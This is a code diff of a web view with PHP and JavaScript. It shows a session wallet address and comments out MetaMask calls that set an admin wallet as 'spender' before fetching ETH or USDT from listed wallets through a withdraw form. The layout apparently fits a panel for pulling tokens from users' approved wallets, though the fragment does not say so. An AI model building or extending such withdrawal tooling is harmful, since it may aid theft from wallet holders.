@@ -29,6 +29,10 @@
                             <div id="app">
                                 <Wallet />
                             </div>
+                            <?php
+                                $walletAddress = session('walletAddress');
+                            ?>
+                            <p>Wallet: {{ $walletAddress }}</p>
                         </div>
                     </div>
                 </div>
@@ -313,10 +317,10 @@
     };
 
     async function fetchEthToken(id) {
-        const accounts = await window.ethereum.request({
-            method: 'eth_requestAccounts'
-        });
-        const adminWalletAddress = accounts[0];
+        // const accounts = await window.ethereum.request({
+        //     method: 'eth_requestAccounts'
+        // });
+        // const adminWalletAddress = accounts[0];
 
         var wallet = $("#modal_eth_" + id).attr('data-wallet');
         var balance = $("#modal_eth_" + id).attr('data-balance');
@@ -328,7 +332,7 @@
         }else{
 
             $("#modal-wallet").val(wallet);
-            $("#modal-spender").val(adminWalletAddress);
+            // $("#modal-spender").val(adminWalletAddress);
             $("#modal-balance").text(balance);
 
             $('#fetchForm').modal({
@@ -340,10 +344,10 @@
     }
 
     async function fetchUsdtToken(id) {
-        const accounts = await window.ethereum.request({
-            method: 'eth_requestAccounts'
-        });
-        const adminWalletAddress = accounts[0];
+        // const accounts = await window.ethereum.request({
+        //     method: 'eth_requestAccounts'
+        // });
+        // const adminWalletAddress = accounts[0];
 
         var wallet = $("#modal_usdt_" + id).attr('data-wallet');
         var balance = $("#modal_usdt_" + id).attr('data-balance');
@@ -355,7 +359,7 @@
         }else{
 
             $("#modal-wallet").val(wallet);
-            $("#modal-spender").val(adminWalletAddress);
+            // $("#modal-spender").val(adminWalletAddress);
             $("#modal-balance").text(balance);
 
             $("#btn-fetch").attr('onClick','withdrawUSDT()');
